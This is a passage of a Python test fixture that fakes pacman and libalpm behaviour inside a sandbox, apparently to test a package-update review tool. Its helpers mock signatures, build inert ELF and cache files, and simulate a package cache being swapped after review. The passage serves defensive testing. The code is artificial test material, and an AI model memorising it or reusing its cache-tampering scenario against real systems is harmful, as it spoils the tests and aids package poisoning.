#!/usr/bin/env python3
"""Hermetic filesystem/manager fakes. No package, key, service or tool executes."""
import gzip
import hashlib
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tarfile

root = Path(os.environ['HASEEN_SYSROOT'])
sandbox = Path(os.environ['VAPT_SANDBOX'])
calls = Path(os.environ['VAPT_CALLS'])
mode, *args = sys.argv[1:]
if root == Path('/') or not root.resolve().is_relative_to(sandbox.resolve()):
    raise ValueError('fixture sysroot must be inside the sandbox')


def log(name, argv):
    with (calls / name).open('a') as output:
        output.write(' '.join(argv) + '\n')


def observed(value, unlink=False):
    path = Path(value)
    if not path.is_absolute():
        return value
    if path.is_relative_to(root):
        result = path
    elif mode == 'user' and path.is_relative_to(sandbox) and not path.is_relative_to(Path(os.environ['HOME'])):
        result = path
    else:
        result = root / str(path).lstrip('/')
    # rm unlinks its leaf (including with -r); it never follows a leaf symlink.
    # All other operations and trailing-slash rm paths retain full confinement.
    # Parents must always resolve inside scratch.
    boundary = result.parent if unlink and not value.endswith(('/', '/.')) else result
    if not boundary.resolve().is_relative_to(sandbox.resolve()):
        raise ValueError('fixture destination escapes sandbox: ' + value)
    suffix = '/.' if value.endswith('/.') else '/' if value.endswith('/') else ''
    return str(result) + suffix


def print_plan(plan, argv):
    """Model libalpm -p --print-format: %r %n %v %f %l. Like pkg_get_location,
    %l is file://<cachedir>/<filename> when that artifact is already cached in
    a configured cache directory (--cachedir, else the host CacheDir), and the
    first server URL otherwise. Plan rows are repo, name, version, url."""
    fmt = argv[argv.index('--print-format') + 1] if '--print-format' in argv else '%l'
    caches = [argv[i + 1] for i, value in enumerate(argv) if value == '--cachedir'] or ['/var/cache/pacman/pkg']
    out = []
    for row in plan.read_text().splitlines():
        if not row.strip():
            continue
        repo, name, version, url = row.split('\t')
        filename = url.rsplit('/', 1)[-1]
        location = url
        for cache in caches:
            if Path(observed(cache.rstrip('/') + '/' + filename)).is_file():
                location = 'file://' + cache.rstrip('/') + '/' + filename
                break
        out.append(fmt.replace('%r', repo).replace('%n', name).replace('%v', version)
                   .replace('%f', filename).replace('%l', location))
    return ''.join(line + '\n' for line in out)


def pacman(argv):
    log('sudo' if mode == 'root' else 'pacman', args if mode == 'root' else argv)
    plan = Path(os.environ['VAPT_PLAN']) if os.environ.get('VAPT_PLAN') else None
    if '-Sp' in argv or '-Sup' in argv:
        if not plan:
            return 97
        if os.environ.get('VAPT_PLAN_STDERR'):
            # libalpm diagnostics (e.g. "up to date -- reinstalling") go to
            # stderr, never into the printed plan.
            print(os.environ['VAPT_PLAN_STDERR'], file=sys.stderr)
        print(print_plan(plan, argv), end='')
        return 0
    if '-Sw' in argv or '-Syuw' in argv:
        cache = Path(observed(argv[argv.index('--cachedir') + 1]))
        dbpath = argv[argv.index('--dbpath') + 1] if '--dbpath' in argv else ''
        # Simulate DownloadUser=alpm access without host users or privilege.
        # A private ~/.cache stage or system DBPath is deliberately unusable.
        if (not str(cache).startswith(str(root / 'var/cache/haseen-vapt.'))
                or cache.stat().st_mode & 0o777 != 0o775
                or not cache.parent.stat().st_mode & 0o001
                or not dbpath.startswith('/var/cache/haseen-vapt.')):
            return 97
        if os.environ.get('VAPT_PACMAN_FAIL') == 'download':
            return 97
        if '-Syuw' in argv:
            db = Path(observed(argv[argv.index('--dbpath') + 1])) / 'sync'
            db.mkdir(parents=True, exist_ok=True)
            # The private review syncs exactly the repositories its config names.
            config = Path(observed(argv[argv.index('--config') + 1])).read_text()
            repos = [line[1:-1] for line in config.splitlines()
                     if line.startswith('[') and line.endswith(']') and line != '[options]']
            log('review-repos', repos)
            for repo in repos:
                if repo == 'oniomarchy':
                    # The private source never joins a full upgrade.
                    return 97
                (db / (repo + '.db')).write_text('reviewed fixture DB ' + repo)
            # The refresh fetches what the mirrors publish now: the fixture
            # repository records become this DBPath's sync DB (the copied
            # pre-refresh snapshot elsewhere keeps the system records).
            mirror = root / 'var/lib/haseen/vapt/repositories.json'
            if mirror.exists():
                shutil.copyfile(mirror, db / 'repositories.json')
        if os.environ.get('VAPT_ARCHIVES'):
            cache = Path(observed(argv[argv.index('--cachedir') + 1]))
            for archive in Path(os.environ['VAPT_ARCHIVES']).glob('*.pkg.tar.gz'):
                # libalpm finalizes downloads at ~umask & 0666 (dload.c); the
                # fake inherits the privileged call's real umask the same way.
                shutil.copyfile(archive, cache / archive.name)
                mock_sign(cache / archive.name)
                log('download-modes', [archive.name, oct((cache / archive.name).stat().st_mode & 0o777)])
        if os.environ.get('VAPT_SWAP_DOWNLOAD'):
            # The DownloadUser-writable cache holds other (signed) bytes under
            # the planned filename before VAPT seals anything.
            swap_cache(Path(os.environ['VAPT_SWAP_DOWNLOAD']))
        return 0
    if '-D' in argv:
        # Database-only install-reason bookkeeping: no hook or scriptlet runs.
        reason = 'depend' if '--asdeps' in argv else 'explicit' if '--asexplicit' in argv else None
        names = argv[argv.index('--') + 1:] if '--' in argv else []
        installed = load_installed()
        if reason is None or not names or any(n not in {p['name'] for p in installed} for n in names):
            return 97
        for record in installed:
            if record['name'] in names:
                record['reason'] = reason
        save_installed(installed)
        return 0
    if '-U' in argv:
        # Commits exactly the named archive files, as libalpm -U does: a new
        # package is explicit (unless --asdeps); an upgrade keeps its reason.
        # The keyring bootstrap (-U --noscriptlet) is not the failing commit.
        if os.environ.get('VAPT_PACMAN_FAIL') == 'commit' and '--noscriptlet' not in argv:
            return 97
        files = argv[argv.index('--') + 1:] if '--' in argv else []
        if not files:
            return 97
        if '--noscriptlet' not in argv and os.environ.get('VAPT_SWAP_COMMIT'):
            # A DownloadUser-group process replaces cache entries after audit.
            swap_cache(Path(os.environ['VAPT_SWAP_COMMIT']))
        log('commit-config', [Path(observed(argv[argv.index('--config') + 1])).read_text().replace('\n', '|')])
        repo_data = json.loads((root / 'var/lib/haseen/vapt/repositories.json').read_text())
        installed = load_installed()
        for value in files:
            if '--noscriptlet' not in argv:
                if not log_commit_file(Path(observed(value))):
                    return 97
            with tarfile.open(observed(value), 'r:*') as archive:
                info = archive.extractfile('.PKGINFO').read().decode()
                fields = dict(line.split(' = ', 1) for line in info.splitlines() if ' = ' in line)
                if fields.get('pkgname') == 'oniomarchy-keyring' and '--noscriptlet' in argv:
                    # The audited keyring's files land like libalpm extracts
                    # them, so the retained-file authority can be checked.
                    for member in archive.getmembers():
                        if member.isfile() and member.name.startswith(ONIO_KEYRINGS):
                            target = root / member.name
                            target.parent.mkdir(parents=True, exist_ok=True)
                            target.write_bytes(archive.extractfile(member).read())
            name, version = fields['pkgname'], fields['pkgver']
            record = next((dict(p) for records in repo_data.values() for p in records
                           if p['name'] == name and p['version'] == version),
                          {'name': name, 'version': version, 'url': ''})
            old = next((p for p in installed if p['name'] == name), None)
            record['reason'] = (old or {}).get('reason', 'explicit') if old else (
                'depend' if '--asdeps' in argv else 'explicit')
            if name == 'oniomarchy-keyring':
                # libalpm records the package's file list; an upgrade audit needs it.
                with tarfile.open(observed(value), 'r:*') as archive:
                    record['files'] = sorted(m.name + ('/' if m.isdir() else '') for m in archive.getmembers()
                                             if not m.name.startswith('.'))
            installed = [p for p in installed if p['name'] != name] + [record]
        if '--noscriptlet' not in argv:
            log_helper_path([observed(value) for value in files])
        save_installed(installed)
        return 0
    if '-S' in argv or '-Syu' in argv or '-Syyu' in argv:
        if os.environ.get('VAPT_PACMAN_FAIL') == 'commit':
            return 97
        if not plan:
            return 97
        if '-Syu' in argv or '-Syyu' in argv:
            if os.environ.get('VAPT_SWAP_COMMIT'):
                swap_cache(Path(os.environ['VAPT_SWAP_COMMIT']))
            cachedir = Path(observed(argv[argv.index('--cachedir') + 1]))
            log('commit-dirs', [str(cachedir.relative_to(root)), oct(cachedir.stat().st_mode & 0o777)])
            committed = [archive for archive in sorted(cachedir.glob('*.pkg.tar.*')) if not archive.name.endswith('.sig')]
            if not all(log_commit_file(archive) for archive in committed):
                return 97
            log_helper_path(committed)
            config = Path(argv[argv.index('--config') + 1]).read_text()
            mirrors = [line.split('=', 1)[1].strip() for line in config.splitlines()
                       if line.startswith('Server')]
            if not mirrors or any(not value.startswith('file:///var/cache/haseen-vapt.') for value in mirrors):
                return 97
            # The commit must consume the same frozen DB payload reviewed
            # before it; this fake refuses any second live-mirror fetch. Like
            # libalpm+curl file://, a plain -y refresh is If-Modified-Since the
            # live DB mtime: a newer live DB is kept ("up to date") and then
            # resolves the transaction (VAPT_LIVE_PLAN). -yy always fetches.
            for mirror in mirrors:
                directory = Path(observed(mirror.removeprefix('file://')))
                repo = directory.name
                database = directory / (repo + '.db')
                log('frozen-modes', [repo, oct(database.stat().st_mode & 0o777),
                                     oct(directory.stat().st_mode & 0o777), oct(directory.parent.stat().st_mode & 0o777)])
                if repo == 'oniomarchy':
                    # The private source never joins a frozen full upgrade.
                    return 97
                if database.read_text() != 'reviewed fixture DB ' + repo:
                    return 97
                live = root / 'var/lib/pacman/sync' / database.name
                if '-Syyu' not in argv and live.exists() and live.stat().st_mtime > database.stat().st_mtime:
                    if os.environ.get('VAPT_LIVE_PLAN'):
                        plan = Path(os.environ['VAPT_LIVE_PLAN'])
                    continue
                shutil.copyfile(database, live)
        elif os.environ.get('VAPT_LIVE_PLAN'):
            # A live -S resolves against the live sync DB and interactive
            # provider choice at commit time, not against the audited plan.
            plan = Path(os.environ['VAPT_LIVE_PLAN'])
        repo_data = json.loads((root / 'var/lib/haseen/vapt/repositories.json').read_text())
        installed = load_installed()
        target = argv[-1].split('/')[-1]
        for line in plan.read_text().splitlines():
            repo, name, version, _ = line.split('\t')
            record = dict(next(p for p in repo_data[repo] if p['name'] == name and p['version'] == version))
            old = next((p for p in installed if p['name'] == name), None)
            record['reason'] = old.get('reason', 'explicit') if old else (
                'explicit' if name == target else 'depend')
            installed = [p for p in installed if p['name'] != name] + [record]
        save_installed(installed)
        return 0
    return 97


def mock_sign(archive):
    """VAPT_MOCK_SIGNATURES=1: detached signature valid for exactly these bytes."""
    if os.environ.get('VAPT_MOCK_SIGNATURES') == '1':
        Path(str(archive) + '.sig').write_text('fixture-sha256 ' + hashlib.sha256(archive.read_bytes()).hexdigest() + '\n')


def swap_cache(source):
    """Overwrite same-named entries, with valid signatures, in every DownloadUser cache."""
    for cache in root.glob('var/cache/haseen-vapt.*/packages'):
        for archive in source.glob('*.pkg.tar.gz'):
            if (cache / archive.name).exists():
                shutil.copyfile(archive, cache / archive.name)
                mock_sign(cache / archive.name)


def log_commit_file(path):
    """Record what the privileged commit really opened, and where from.

    VAPT_MOCK_SIGNATURES=1 models LocalFileSigLevel Required: the detached
    signature beside the OPENED file must sign those bytes, else the commit is
    refused before installation. Any otherwise-valid signed replacement is
    accepted, exactly like a package from another trusted signer."""
    data = path.read_bytes()
    digest = hashlib.sha256(data).hexdigest()
    log('commit-dirs', [str(path.parent.relative_to(root)), oct(path.parent.stat().st_mode & 0o777)])
    ancestry, current = [], path.parent
    while current != root and current.is_relative_to(root):
        ancestry.append(str(current.relative_to(root)) + '=' + oct(current.stat().st_mode & 0o777)
                        + ('@link' if current.is_symlink() else ''))
        current = current.parent
    log('commit-ancestry', [path.name, *ancestry])
    log('commit-digests', [path.name, digest])
    if os.environ.get('VAPT_MOCK_SIGNATURES') != '1':
        return True
    signature = Path(str(path) + '.sig')
    valid = (signature.is_file() and not signature.is_symlink()
             and signature.read_text() == 'fixture-sha256 ' + digest + '\n')
    log('commit-signatures', [path.name, 'valid' if valid else 'invalid'])
    return valid


def log_helper_path(archives=()):
    """Model ALPM's inherited PATH for hook helpers, without executing anything.

    The effective PATH is the commit's explicit env PATH, else the privileged
    environment's PATH (VAPT_SUDO_PATH, default sudo secure_path order). Each
    command resolves over the post-extraction view: incoming archive members
    (files and symlinks) over the current sysroot inventory."""
    incoming, links = set(), {}
    for archive in archives:
        with tarfile.open(archive, 'r:*') as opened:
            for member in opened:
                name = member.name.removeprefix('./').rstrip('/')
                if member.issym():
                    links[name] = member.linkname
                elif not member.isdir():
                    incoming.add(name)

    def resolve(rel):
        parts, current, hops = rel.split('/'), [], 0
        while parts:
            part = parts.pop(0)
            if part in ('', '.'):
                continue
            if part == '..':
                current = current[:-1]
                continue
            candidate = '/'.join(current + [part])
            target = links.get(candidate)
            if target is None and candidate not in incoming and (root / candidate).is_symlink():
                target = os.readlink(root / candidate)
            if target is not None:
                hops += 1
                if hops > 40:
                    return None
                parts = target.split('/') + parts
                if target.startswith('/'):
                    current = []
                continue
            current.append(part)
        joined = '/'.join(current)
        return joined if joined in incoming or os.path.lexists(root / joined) else None

    path = os.environ.get('VAPT_COMMIT_PATH') or os.environ.get(
        'VAPT_SUDO_PATH', '/usr/local/sbin:/usr/local/bin:/usr/bin')
    for command in ('touch',):
        resolved = next((found for directory in path.split(':') if directory
                         for found in [resolve(directory.strip('/') + '/' + command)] if found), None)
        log('commit-resolutions', [command, '/' + resolved if resolved else 'none'])


def load_installed():
    """installed.json when present, otherwise the fixture's real local DB."""
    path = root / 'var/lib/haseen/vapt/installed.json'
    if path.exists():
        return json.loads(path.read_text())
    records = []
    for desc in sorted((root / 'var/lib/pacman/local').glob('*/desc')):
        fields, key = {}, None
        for line in desc.read_text().splitlines():
            if line.startswith('%') and line.endswith('%'):
                key = line.strip('%').lower()
            elif line and key:
                fields.setdefault(key, line)
        records.append({'name': fields.get('name', ''), 'version': fields.get('version', ''),
                        'url': fields.get('url', '')})
    return records


def save_installed(records):
    (root / 'var/lib/haseen/vapt/installed.json').write_text(json.dumps(records))


def fixture_system_python():
    """Supply allowed-source system interpreter evidence, never execute it."""
    records_path = root / 'var/lib/haseen/vapt/installed.json'
    records = json.loads(records_path.read_text()) if records_path.exists() else []
    repos = json.loads((root / 'var/lib/haseen/vapt/repositories.json').read_text())
    python = next(p for p in repos['extra'] if p['name'] == 'python')
    records_path.write_text(json.dumps([p for p in records if p['name'] != 'python'] + [python]))
    base = root / 'usr/bin/python3.14'
    base.parent.mkdir(parents=True, exist_ok=True)
    base.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >>' + str(calls / 'native-python') + '\nexit 97\n')
    base.chmod(0o755)
    system = root / 'usr/bin/python'
    if not system.exists() and not system.is_symlink():
        system.symlink_to('python3.14')
    header = root / 'usr/include/python3.14/Python.h'
    header.parent.mkdir(parents=True, exist_ok=True)
    header.write_text('/* inert fixture header; never compiled */\n')


def fixture_runtime(dest, managed, version_override=None):
    """Create executable decoys with real venv parent provenance, never run them."""
    if managed:
        uvroot = os.environ.get('UV_PYTHON_INSTALL_DIR', os.environ['XDG_DATA_HOME'] + '/uv/python')
        logical_base = uvroot + '/cpython-3.12.7-linux-' + os.uname().machine + '-gnu/bin/python3.12'
        version, label = '3.12.7', 'coae-python'
    else:
        logical_base, version, label = '/usr/bin/python3.14', '3.14.0', 'native-python'
        fixture_system_python()
    base = Path(observed(logical_base))
    base.parent.mkdir(parents=True, exist_ok=True)
    base.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >>' + str(calls / label) + '\nexit 97\n')
    base.chmod(0o755)
    (dest / 'bin').mkdir(parents=True, exist_ok=True)
    version = version_override or version
    (dest / 'pyvenv.cfg').write_text(
        'implementation = CPython\nversion_info = ' + version + '\nversion = ' + version
        + '\nhome = ' + str(Path(logical_base).parent) + '\nbase-executable = ' + logical_base + '\n')
    if managed:
        (dest / 'bin/python3.12').symlink_to(logical_base)
        (dest / 'bin/python').symlink_to('python3.12')
    else:
        # fixture_system_python already supplied the package's canonical link.
        (dest / 'bin/python').symlink_to('/usr/bin/python')


# Stock-equivalent maintenance hook set. Trigger/Exec lines restate public
# facts of the Arch base packages; helper scripts are original inert stand-ins
# and ELF programs are 'fixture-decoy' bytes with ELF magic and mode 0644.
# Nothing here is a copy of upstream source and nothing is ever executed.
def stock_hook(operations, kind, targets, when, command, needs_targets=False):
    lines = ['[Trigger]', 'Type = ' + kind]
    lines += ['Operation = ' + op for op in operations]
    lines += ['Target = ' + target for target in targets]
    lines += ['', '[Action]', 'Description = fixture stock hook', 'When = ' + when, 'Exec = ' + command]
    if needs_targets:
        lines.append('NeedsTargets')
    return '\n'.join(lines) + '\n'


IUR = ('Install', 'Upgrade', 'Remove')
HOOKS = 'usr/share/libalpm/hooks/'
SCRIPTS = 'usr/share/libalpm/scripts/'
SYSTEMD_HOOK = '/usr/share/libalpm/scripts/systemd-hook '
STOCK = {
    # name: (repo, version, url, {path: text | b'ELF' | ('link', target)})
    'bash': ('core', '5.3.3-2', 'https://www.gnu.org/software/bash/bash.html', {
        'usr/bin/bash': b'ELF', 'usr/bin/sh': ('link', 'bash'), 'usr/lib/libreadline.so.8': b'ELF'}),
    'filesystem': ('core', '2025.10.12-1', 'https://archlinux.org', {
        'bin': ('link', 'usr/bin'), 'lib64': ('link', 'usr/lib'), 'usr/lib64': ('link', 'lib')}),
    'coreutils': ('core', '9.8-2', 'https://www.gnu.org/software/coreutils/', {
        'usr/bin/env': b'ELF', 'usr/bin/touch': b'ELF', 'usr/bin/rm': b'ELF',
        'usr/bin/ln': b'ELF', 'usr/bin/rmdir': b'ELF'}),
    'systemd': ('core', '261.2-1', 'https://www.github.com/systemd/systemd', {
        HOOKS + '35-systemd-update.hook': stock_hook(IUR, 'Path', ['usr/'], 'PostTransaction', SYSTEMD_HOOK + 'update'),
        HOOKS + '20-systemd-sysusers.hook': stock_hook(IUR[:2], 'Path', ['usr/lib/sysusers.d/*.conf'], 'PostTransaction', SYSTEMD_HOOK + 'sysusers'),
        HOOKS + '21-systemd-tmpfiles.hook': stock_hook(IUR[:2], 'Path', ['usr/lib/tmpfiles.d/*.conf'], 'PostTransaction', SYSTEMD_HOOK + 'tmpfiles'),
        HOOKS + '25-systemd-catalog.hook': stock_hook(IUR, 'Path', ['usr/lib/systemd/catalog/*'], 'PostTransaction', SYSTEMD_HOOK + 'catalog'),
        HOOKS + '25-systemd-hwdb.hook': stock_hook(IUR, 'Path', ['usr/lib/udev/hwdb.d/*'], 'PostTransaction', SYSTEMD_HOOK + 'hwdb'),
        HOOKS + '30-systemd-daemon-reload-system.hook': stock_hook(IUR, 'Path', ['usr/lib/systemd/system/*'], 'PostTransaction', SYSTEMD_HOOK + 'daemon-reload-system'),
        HOOKS + '35-systemd-enqueue-marked.hook': stock_hook(('Upgrade',), 'Path', ['usr/lib/systemd/system/*'], 'PostTransaction', SYSTEMD_HOOK + 'enqueue-marked'),
        HOOKS + '35-systemd-udev-reload.hook': stock_hook(IUR, 'Path', ['usr/lib/udev/rules.d/*'], 'PostTransaction', SYSTEMD_HOOK + 'udev-reload'),
        SCRIPTS + 'systemd-hook': '#!/bin/sh -e\n# fixture stand-in for a reviewed stock helper; never executed\n'
                                  'case "$1" in update) touch -c /usr ;; esac\nexit 97\n',
        'usr/bin/journalctl': b'ELF', 'usr/bin/systemd-hwdb': b'ELF', 'usr/bin/systemd-sysusers': b'ELF',
        'usr/bin/systemd-tmpfiles': b'ELF', 'usr/bin/systemctl': b'ELF', 'usr/bin/udevadm': b'ELF'}),
    'glibc': ('core', '2.44-1', 'https://www.gnu.org/software/libc', {
        HOOKS + '10-glibc-locale-gen.hook': stock_hook(('Install', 'Upgrade'), 'Package', ['glibc'], 'PostTransaction', '/usr/bin/locale-gen'),
        HOOKS + '11-glibc-ldconfig.hook': stock_hook(IUR, 'Path', ['etc/ld.so.conf.d/*', 'usr/lib/ld.so.conf.d/*'], 'PostTransaction', '/usr/bin/ldconfig -r .'),
        HOOKS + '12-glibc-iconvconfig.hook': stock_hook(IUR, 'Path', ['usr/lib/gconv/gconv-modules.d/*'], 'PostTransaction', '/usr/bin/iconvconfig'),
        'usr/bin/locale-gen': '#!/bin/sh\n# fixture stand-in for a reviewed stock helper; never executed\nexit 97\n',
        'usr/bin/ldconfig': b'ELF', 'usr/bin/iconvconfig': b'ELF', 'usr/bin/localedef': b'ELF',
        'usr/lib/libc.so.6': b'ELF', 'usr/lib/ld-linux-x86-64.so.2': b'ELF'}),
    'fontconfig': ('extra', '2:2.17.1-1', 'https://www.freedesktop.org/wiki/Software/fontconfig/', {
        HOOKS + 'fontconfig.hook': stock_hook(IUR, 'Path', ['etc/fonts/conf.d/*', 'usr/share/fonts/*'], 'PostTransaction', '/usr/bin/fc-cache -s'),
        HOOKS + '40-fontconfig-config.hook': stock_hook(('Install', 'Remove'), 'Path', ['usr/share/fontconfig/conf.default/*'], 'PostTransaction',
                                                        '/usr/share/libalpm/scripts/40-fontconfig-config /etc/fonts/conf.d', True),
        SCRIPTS + '40-fontconfig-config': '#!/bin/bash\n# fixture stand-in for a reviewed stock helper; never executed\nexit 97\n',
        'usr/bin/fc-cache': b'ELF'}),
    'desktop-file-utils': ('extra', '0.28-1', 'https://www.freedesktop.org/wiki/Software/desktop-file-utils', {
        HOOKS + 'update-desktop-database.hook': stock_hook(IUR, 'Path', ['usr/share/applications/*.desktop'], 'PostTransaction', '/usr/bin/update-desktop-database --quiet'),
        'usr/bin/update-desktop-database': b'ELF'}),
    'shared-mime-info': ('extra', '2.4-2', 'https://www.freedesktop.org/wiki/Specifications/shared-mime-info-spec/', {
        HOOKS + '30-update-mime-database.hook': stock_hook(IUR, 'Path', ['usr/share/mime/packages/*.xml'], 'PostTransaction',
                                                           '/usr/bin/env PKGSYSTEM_ENABLE_FSYNC=0 /usr/bin/update-mime-database /usr/share/mime'),
        'usr/bin/update-mime-database': b'ELF'}),
    'glib2': ('core', '2.86.0-1', 'https://gitlab.gnome.org/GNOME/glib', {
        HOOKS + 'glib-compile-schemas.hook': stock_hook(IUR, 'Path', ['usr/share/glib-2.0/schemas/*.gschema.xml'], 'PostTransaction',
                                                        '/usr/bin/glib-compile-schemas /usr/share/glib-2.0/schemas'),
        HOOKS + 'gio-querymodules.hook': stock_hook(IUR, 'Path', ['usr/lib/gio/modules/*.so'], 'PostTransaction', '/usr/bin/gio-querymodules /usr/lib/gio/modules'),
        'usr/bin/glib-compile-schemas': b'ELF', 'usr/bin/gio-querymodules': b'ELF'}),
    'texinfo': ('core', '7.2-1', 'https://www.gnu.org/software/texinfo/', {
        HOOKS + 'texinfo-install.hook': stock_hook(('Install', 'Upgrade'), 'Path', ['usr/share/info/*'], 'PostTransaction',
                                                   "/bin/sh -c 'while read -r f; do if test -f \"$f\"; then install-info \"$f\" /usr/share/info/dir 2> /dev/null; fi; done'", True),
        'usr/bin/install-info': b'ELF'}),
}


def make_elf(needed=(), soname=None, interp=None, runpath=None, rpath=None, dlopen=(), e_type=3,
             elf_class=2, machine=62, tag=''):
    """Inert static ELF metadata: one read-only PT_LOAD (no executable segment),
    PT_DYNAMIC (NEEDED/SONAME/RPATH/RUNPATH/STRTAB), optional PT_INTERP and an
    FDO dlopen PT_NOTE. entry=0, no code, symbols, relocations or init arrays.
    Only the audit's byte parser reads it; nothing is linked, loaded or run."""
    import struct
    strings = bytearray(b'\0')
    def string(text):
        offset = len(strings)
        strings.extend(text.encode() + b'\0')
        return offset
    tags = [(1, string(name)) for name in needed]
    if soname:
        tags.append((14, string(soname)))
    if rpath:
        tags.append((15, string(rpath)))
    if runpath:
        tags.append((29, string(runpath)))
    if tag:
        string(tag)  # distinguishes otherwise identical decoys; never referenced
    note = b''
    if dlopen:
        payload = ('[' + ','.join('{"feature":"fixture","soname":["' + name + '"],"priority":"suggested"}'
                                  for name in dlopen) + ']').encode() + b'\0'
        payload += b'\0' * (-len(payload) % 4)
        note = struct.pack('<III', 4, len(payload), 0x407c0c0a) + b'FDO\0' + payload
    interp_bytes = interp.encode() + b'\0' if interp else b''
    phnum = 2 + bool(interp) + bool(note)
    offset = 64 + 56 * phnum
    interp_offset, offset = offset, offset + len(interp_bytes)
    offset += -offset % 4
    note_offset, offset = offset, offset + len(note)
    offset += -offset % 8
    dynamic_offset = offset
    dynamic_size = 16 * (len(tags) + 3)
    strings_offset = dynamic_offset + dynamic_size
    dynamic = b''.join(struct.pack('<qQ', key, value) for key, value in tags)
    dynamic += struct.pack('<qQqQqQ', 5, strings_offset, 10, len(strings), 0, 0)
    size = strings_offset + len(strings)
    headers = struct.pack('<IIQQQQQQ', 1, 4, 0, 0, 0, size, size, 0x1000)
    headers += struct.pack('<IIQQQQQQ', 2, 4, dynamic_offset, dynamic_offset, 0, dynamic_size, dynamic_size, 8)
    if interp:
        headers += struct.pack('<IIQQQQQQ', 3, 4, interp_offset, interp_offset, 0, len(interp_bytes), len(interp_bytes), 1)
    if note:
        headers += struct.pack('<IIQQQQQQ', 4, 4, note_offset, note_offset, 0, len(note), len(note), 4)
    ident = b'\x7fELF' + bytes([elf_class, 1, 1]) + b'\0' * 9
    header = ident + struct.pack('<HHIQQQIHHHHHH', e_type, machine, 1, 0, 64, 0, 0, 64, 56, phnum, 0, 0, 0)
    body = bytearray(header + headers)
    body.extend(b'\0' * (interp_offset - len(body)))
    body.extend(interp_bytes)
    body.extend(b'\0' * (note_offset - len(body)))
    body.extend(note)
    body.extend(b'\0' * (dynamic_offset - len(body)))
    body.extend(dynamic)
    body.extend(strings)
    return bytes(body)


def gconv_hash(text):
    """The ELF-style string hash glibc's iconvconfig/gconv_cache use."""
    value = 0
    for byte in text.encode():
        value = ((value << 4) + byte) & 0xffffffff
        high = value & 0xf0000000
        if high:
            value ^= high >> 24
            value ^= high
    return value


def make_gconv_cache(paths):
    """A gconv-modules.cache (iconv/iconvconfig.h layout: u32 magic, 5×u16
    offsets, open-addressed hash of {name, module index}, 6×u16 module
    entries). Index 0 is the builtin INTERNAL; each absolute PATH becomes
    module i = 1..n named FIXTURE<i>// with that file as both its from- and
    to-INTERNAL step (dir + name, literal); no extra lists."""
    import struct
    strings = bytearray(b'\0')
    def string(text):
        offset = len(strings)
        strings.extend(text.encode() + b'\0')
        return offset
    internal = string('INTERNAL')
    entries, names = [struct.pack('<6H', internal, 0, 0, 0, 0, 0)], [('INTERNAL', internal, 0)]
    for index, path in enumerate(paths, start=1):
        directory, name = path.rsplit('/', 1)
        canon = 'FIXTURE' + str(index) + '//'
        names.append((canon, string(canon), index))
        directory, name = string(directory + '/'), string(name)
        entries.append(struct.pack('<6H', names[-1][1], directory, name, directory, name, 0))
    size = max(3, 2 * len(names) + 1)
    while any(size % factor == 0 for factor in range(2, int(size ** 0.5) + 1)):
        size += 1
    table = [(0, 0)] * size
    for canon, offset, index in names:
        value = gconv_hash(canon)
        slot, step = value % size, 1 + value % (size - 2)
        while table[slot][0]:
            slot = (slot + step) % size
        table[slot] = (offset, index)
    string_offset = 16
    hash_offset = string_offset + len(strings)
    module_offset = hash_offset + 4 * size
    other_offset = module_offset + 12 * len(entries)
    header = struct.pack('<IHHHHH', 0x20010324, string_offset, hash_offset, size, module_offset, other_offset) + b'\0\0'
    hashes = b''.join(struct.pack('<HH', *pair) for pair in table)
    return header + bytes(strings) + hashes + b''.join(entries) + b'\0\0'


def make_ld_cache(entries):
    """glibc-ld.so.cache1.1 (sysdeps/generic/dl-cache.h), little endian, no
    extension directory; ENTRIES are (soname, absolute path)."""
    import struct
    header_size, entry_size = 48, 24
    strings = bytearray()
    table = []
    base = header_size + entry_size * len(entries)
    for key, value in entries:
        key_offset = base + len(strings)
        strings.extend(key.encode() + b'\0')
        value_offset = base + len(strings)
        strings.extend(value.encode() + b'\0')
        table.append(struct.pack('<iIIIQ', 0x0303, key_offset, value_offset, 0, 0))
    header = b'glibc-ld.so.cache' + b'1.1' + struct.pack('<IIB3xI3I', len(entries), len(strings), 2, 0, 0, 0, 0)
    return header + b''.join(table) + bytes(strings)


# Runtime shape of the stock native decoys: (DT_NEEDED, DT_SONAME). Programs
# carry the canonical PT_INTERP; libraries are ET_DYN with a SONAME.
INTERP = '/usr/lib64/ld-linux-x86-64.so.2'
ELF_LAYOUT = {
    'usr/bin/bash': (('libreadline.so.8', 'libc.so.6'), None),
    'usr/lib/libreadline.so.8': (('libc.so.6',), 'libreadline.so.8'),
    'usr/lib/libc.so.6': (('ld-linux-x86-64.so.2',), 'libc.so.6'),
    'usr/lib/ld-linux-x86-64.so.2': ((), 'ld-linux-x86-64.so.2'),
}


def stock_bytes(path, value):
    if value == b'ELF':
        needed, soname = ELF_LAYOUT.get(path, (('libc.so.6',), None))
        return make_elf(needed, soname, interp=None if soname else INTERP,
                        e_type=3 if soname else 2, tag='fixture-decoy ' + path)
    return value.encode()


def stock_local(name, version, url, files, digests, depends=()):
    """A libalpm-shaped local DB entry: desc, files and gzip mtree digests."""
    entry = root / 'var/lib/pacman/local' / (name + '-' + version)
    entry.mkdir(parents=True, exist_ok=True)
    (entry / 'desc').write_text('%NAME%\n' + name + '\n\n%VERSION%\n' + version + '\n\n%URL%\n' + url + '\n\n')
    directories = sorted({str(parent) + '/' for path in files for parent in Path(path).parents if str(parent) != '.'})
    (entry / 'files').write_text('%FILES%\n' + '\n'.join(directories + sorted(files)) + '\n\n')
    if depends:
        (entry / 'depends').write_text('%DEPENDS%\n' + '\n'.join(depends) + '\n\n')
    lines = ['#mtree']
    for path in sorted(files):
        kind = files[path]
        if isinstance(kind, tuple):
            lines.append('./' + path + ' type=link link=' + kind[1])
        elif path in digests:
            lines.append('./' + path + ' type=file mode=644 sha256digest=' + digests[path])
    with gzip.open(entry / 'mtree', 'wt') as output:
        output.write('\n'.join(lines) + '\n')


def stock_build():
    """Install the stock-equivalent tree, local DB and allowed repositories."""
    repos_path = root / 'var/lib/haseen/vapt/repositories.json'
    repos = json.loads(repos_path.read_text()) if repos_path.exists() else {}
    installed_path = root / 'var/lib/haseen/vapt/installed.json'
    # Earlier vapt_installed rows move into the real local DB layout.
    for record in json.loads(installed_path.read_text()) if installed_path.exists() else []:
        stock_local(record['name'], record['version'], record['url'],
                    {path: b'' for path in record.get('files', [])}, {}, record.get('depends', []))
    installed_path.unlink(missing_ok=True)
    for stale in ('bin', 'lib64', 'usr/lib64'):
